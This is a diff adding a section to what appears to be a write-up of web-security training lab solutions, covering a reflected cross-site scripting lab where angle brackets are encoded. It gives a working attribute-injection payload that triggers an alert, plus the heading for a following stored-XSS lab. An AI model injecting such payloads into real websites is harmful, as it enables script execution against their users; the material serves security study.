@@ -304,7 +304,19 @@ Payload
 
 ## 10. Lab: Reflected XSS into attribute with angle brackets HTML-encoded
 
+```
+This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function.
+```
 
+Payload
+
+```
+" autofocus onfocus=alert(1) x="
+```
+
+![](img30.png)
+
+## 11. Lab: Stored XSS into anchor `href` attribute with double quotes HTML-encoded
 
 
 
